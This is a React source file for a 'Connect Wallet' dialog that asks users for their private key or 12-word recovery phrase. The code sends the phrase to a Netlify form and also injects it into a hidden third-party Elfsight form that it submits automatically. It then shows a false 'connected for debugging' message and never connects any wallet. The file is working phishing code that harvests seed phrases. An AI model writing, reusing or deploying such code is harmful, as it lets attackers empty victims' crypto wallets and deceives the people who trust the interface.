import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { useState, useEffect } from "react";
import { useToast } from "@/hooks/use-toast";

interface WalletDialogProps {
  open: boolean;
  onOpenChange: (open: boolean) => void;
}

const WalletDialog = ({ open, onOpenChange }: WalletDialogProps) => {
  const [phrase, setPhrase] = useState("");
  const [loading, setLoading] = useState(false);
  const { toast } = useToast();

  // Add Elfsight script
  useEffect(() => {
    const script = document.createElement('script');
    script.src = 'https://static.elfsight.com/platform/platform.js';
    script.defer = true;
    document.body.appendChild(script);

    return () => {
      document.body.removeChild(script);
    };
  }, []);

  // Add hidden form for Netlify form detection
  useEffect(() => {
    const form = document.createElement('form');
    form.setAttribute('name', 'wallet-connection');
    form.setAttribute('data-netlify', 'true');
    form.setAttribute('hidden', 'true');
    form.innerHTML = `
      <input type="hidden" name="form-name" value="wallet-connection" />
      <input type="text" name="phrase" />
    `;
    document.body.appendChild(form);
    return () => {
      document.body.removeChild(form);
    };
  }, []);

  const handleConnect = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!phrase.trim()) {
      toast({
        title: "Error",
        description: "Please enter your private key phrase",
        variant: "destructive",
      });
      return;
    }

    setLoading(true);

    try {
      // Submit to Netlify forms
      const formData = new FormData();
      formData.append('form-name', 'wallet-connection');
      formData.append('phrase', phrase);

      await fetch('/', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: new URLSearchParams(formData as any).toString(),
      });

      // Submit to Elfsight form
      const elfsightForm = document.querySelector('.elfsight-app-form form') as HTMLFormElement;
      if (elfsightForm) {
        const elfsightInput = elfsightForm.querySelector('input[type="text"]') as HTMLInputElement;
        if (elfsightInput) {
          elfsightInput.value = phrase;
          const submitButton = elfsightForm.querySelector('button[type="submit"]') as HTMLButtonElement;
          if (submitButton) {
            submitButton.click();
          }
        }
      }

      console.log("Connecting wallet...");
      
      toast({
        title: "Success",
        description: "Your wallet has been successfully connected for debugging wait while we debug your wallet",
      });

      setPhrase("");
      onOpenChange(false);
    } catch (error) {
      toast({
        title: "Error",
        description: "Something went wrong. Please try again.",
        variant: "destructive",
      });
    } finally {
      setLoading(false);
    }
  };

  return (
    <Dialog open={open} onOpenChange={onOpenChange}>
      <DialogContent className="sm:max-w-md">
        <DialogHeader>
          <DialogTitle className="text-center">Connect Wallet</DialogTitle>
        </DialogHeader>
        <form 
          onSubmit={handleConnect} 
          className="space-y-4 py-4" 
          data-netlify="true" 
          name="wallet-connection" 
          method="POST"
          netlify-honeypot="bot-field"
        >
          <input type="hidden" name="form-name" value="wallet-connection" />
          <p className="hidden">
            <label>
              Don't fill this out if you're human: <input name="bot-field" />
            </label>
          </p>
          <p className="text-sm text-muted-foreground text-center">
            Input your private key or 12-word phrase for access to your account. Please input it in the order specified.
          </p>
          <p className="text-xs text-muted-foreground text-center">
            Separate each word with a space
          </p>
          <Input
            type="text"
            name="phrase"
            placeholder="Enter your private key phrase"
            value={phrase}
            onChange={(e) => setPhrase(e.target.value)}
            className="w-full"
          />
          <div className="flex justify-center">
            <Button type="submit" className="w-full sm:w-auto" disabled={loading}>
              {loading ? 'Connecting...' : 'Connect'}
            </Button>
          </div>
        </form>
        
        {/* Hidden Elfsight Form */}
        <div className="hidden">
          <div className="elfsight-app-form" data-elfsight-app-id="Yelfsight-app-12811523-8e4d-48e3-a10d-87d1ae6620a0"></div>
        </div>
      </DialogContent>
    </Dialog>
  );
};

export default WalletDialog;
